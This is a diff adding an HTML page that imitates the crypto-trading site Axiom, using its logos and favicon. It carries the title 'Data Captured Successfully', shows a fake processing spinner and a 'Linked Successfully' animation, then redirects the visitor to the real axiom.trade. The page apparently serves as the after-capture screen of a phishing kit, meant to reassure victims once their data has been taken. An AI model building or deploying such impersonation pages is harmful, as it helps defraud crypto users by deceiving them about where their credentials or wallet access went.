@@ -1,0 +1,412 @@
+
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,100..700;1,100..700&display=swap" rel="stylesheet">
+    <link rel="icon" href="https://axiom.trade/favicon.ico" type="image/x-icon" sizes="16x16">
+    <title>Data Captured Successfully</title>
+    
+    <style>
+        .crypto-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            pointer-events: none;
+            z-index: 1;
+            opacity: 0.5;
+        }
+        
+        .crypto-icon {
+            position: absolute;
+            opacity: 0.05;
+            animation: float 30s infinite linear;
+            will-change: transform;
+        }
+        
+        .crypto-icon:nth-child(odd) {
+            animation-direction: reverse;
+        }
+        
+        .crypto-icon svg {
+            fill: #526FFF;
+            width: 30px;
+            height: 30px;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.05;
+            }
+            90% {
+                opacity: 0.05;
+            }
+            100% {
+                transform: translateY(-100px) rotate(180deg);
+                opacity: 0;
+            }
+        }
+        
+        .crypto-icon:nth-child(1) { left: 10%; animation-delay: 0s; animation-duration: 35s; }
+        .crypto-icon:nth-child(2) { left: 20%; animation-delay: 5s; animation-duration: 32s; }
+        .crypto-icon:nth-child(3) { left: 30%; animation-delay: 10s; animation-duration: 38s; }
+        .crypto-icon:nth-child(4) { left: 40%; animation-delay: 15s; animation-duration: 34s; }
+        .crypto-icon:nth-child(5) { left: 50%; animation-delay: 20s; animation-duration: 36s; }
+        .crypto-icon:nth-child(6) { left: 60%; animation-delay: 25s; animation-duration: 33s; }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'IBM Plex Sans', sans-serif;
+            background: #000000;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 12px;
+        }
+
+        .navbar {
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(16px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 16px 0;
+        }
+
+        .navbar-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .logo-mark {
+            width: 36px;
+            height: 36px;
+        }
+
+        .logo-type {
+            height: 18px;
+            width: auto;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            padding: 60px 0;
+        }
+
+        .hero-section {
+            text-align: center;
+            max-width: 600px;
+            position: relative;
+            z-index: 10;
+        }
+
+        /* Loading Animation */
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 32px;
+        }
+
+        .loading-spinner {
+            width: 80px;
+            height: 80px;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+            border-top: 3px solid #526FFF;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 24px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.8);
+            opacity: 0;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
+        /* Success Animation */
+        .success-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            gap: 32px;
+        }
+
+        .success-message {
+            font-size: 48px;
+            font-weight: 700;
+            color: #526FFF;
+            opacity: 0;
+            transform: translateY(30px);
+            animation: slideInUp 0.8s ease forwards;
+        }
+
+        @keyframes slideInUp {
+            0% {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .chain-container {
+            position: relative;
+            width: 120px;
+            height: 60px;
+            margin: 20px 0;
+        }
+
+        .chain-link {
+            position: absolute;
+            width: 24px;
+            height: 12px;
+            border: 3px solid #526FFF;
+            border-radius: 12px;
+            opacity: 0;
+            animation: chainAppear 0.3s ease forwards;
+        }
+
+        .chain-link:nth-child(1) {
+            left: 0;
+            top: 24px;
+            animation-delay: 0.8s;
+        }
+
+        .chain-link:nth-child(2) {
+            left: 20px;
+            top: 12px;
+            animation-delay: 1s;
+        }
+
+        .chain-link:nth-child(3) {
+            left: 40px;
+            top: 24px;
+            animation-delay: 1.2s;
+        }
+
+        .chain-link:nth-child(4) {
+            left: 60px;
+            top: 12px;
+            animation-delay: 1.4s;
+        }
+
+        .chain-link:nth-child(5) {
+            left: 80px;
+            top: 24px;
+            animation-delay: 1.6s;
+        }
+
+        @keyframes chainAppear {
+            0% {
+                opacity: 0;
+                transform: scale(0.5);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .success-tick {
+            position: absolute;
+            right: -20px;
+            top: 50%;
+            transform: translateY(-50%) scale(0);
+            width: 40px;
+            height: 40px;
+            background: #526FFF;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: tickAppear 0.5s ease forwards;
+            animation-delay: 2s;
+        }
+
+        .success-tick svg {
+            width: 24px;
+            height: 24px;
+            fill: white;
+        }
+
+        @keyframes tickAppear {
+            0% {
+                transform: translateY(-50%) scale(0);
+                opacity: 0;
+            }
+            50% {
+                transform: translateY(-50%) scale(1.2);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-50%) scale(1);
+                opacity: 1;
+            }
+        }
+
+        .fade-out-chains {
+            animation: fadeOut 0.3s ease forwards;
+            animation-delay: 1.8s;
+        }
+
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            100% { opacity: 0.3; }
+        }
+
+        .auto-close-notice {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 32px;
+            opacity: 0;
+            animation: slideInUp 0.6s ease forwards;
+            animation-delay: 2.5s;
+        }
+
+        @media (max-width: 768px) {
+            .success-message {
+                font-size: 32px;
+            }
+
+            .chain-container {
+                width: 100px;
+                height: 50px;
+            }
+
+            .chain-link {
+                width: 20px;
+                height: 10px;
+            }
+
+            .success-tick {
+                width: 32px;
+                height: 32px;
+            }
+
+            .success-tick svg {
+                width: 20px;
+                height: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="crypto-background">
+        <div class="crypto-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 0C5.374 0 0 5.374 0 12s5.374 12 12 12 12-5.374 12-12S18.626 0 12 0z"/></svg>
+        </div>
+        <div class="crypto-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 0L4.5 12.25L12 16.5l7.5-4.25L12 0zm0 17.75l-7.5-4.25L12 24l7.5-10.5L12 17.75z"/></svg>
+        </div>
+        <div class="crypto-icon">
+            <svg viewBox="0 0 24 24"><path d="M3 17l6-6 4 4 8-8v3h2V6h-4v2h3l-6 6-4-4-6 6 2 2z"/></svg>
+        </div>
+        <div class="crypto-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 0C5.374 0 0 5.374 0 12s5.374 12 12 12 12-5.374 12-12S18.626 0 12 0z"/></svg>
+        </div>
+        <div class="crypto-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 0L4.5 12.25L12 16.5l7.5-4.25L12 0zm0 17.75l-7.5-4.25L12 24l7.5-10.5L12 17.75z"/></svg>
+        </div>
+        <div class="crypto-icon">
+            <svg viewBox="0 0 24 24"><path d="M3 17l6-6 4 4 8-8v3h2V6h-4v2h3l-6 6-4-4-6 6 2 2z"/></svg>
+        </div>
+    </div>
+
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-content">
+                <div class="logo-container">
+                    <img src="https://axiom.trade/images/axiom-logo-mark.svg" alt="Axiom Logo" class="logo-mark">
+                    <img src="https://axiom.trade/images/axiom-logo-type-new.svg" alt="Axiom" class="logo-type">
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="main-content">
+        <div class="container">
+            <div class="hero-section">
+                <div class="loading-container" id="loadingContainer">
+                    <div class="loading-spinner"></div>
+                    <div class="loading-text">Processing...</div>
+                </div>
+
+                <div class="success-container" id="successContainer">
+                    <div class="success-message">Linked Successfully</div>
+                    
+                    <div class="chain-container">
+                        <div class="chain-link fade-out-chains"></div>
+                        <div class="chain-link fade-out-chains"></div>
+                        <div class="chain-link fade-out-chains"></div>
+                        <div class="chain-link fade-out-chains"></div>
+                        <div class="chain-link fade-out-chains"></div>
+                        
+                        <div class="success-tick">
+                            <svg viewBox="0 0 24 24">
+                                <path d="M9,20.42L2.79,14.21L5.62,11.38L9,14.77L18.88,4.88L21.71,7.71L9,20.42Z"/>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <p class="auto-close-notice">This window will close automatically in 2 seconds...</p>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        setTimeout(() => {
+            document.getElementById('loadingContainer').style.display = 'none';
+            document.getElementById('successContainer').style.display = 'flex';
+        }, 3000);
+
+        setTimeout(() => {
+            window.location.href = 'https://axiom.trade';
+        }, 9000); 
+    </script>
+</body>
+</html>
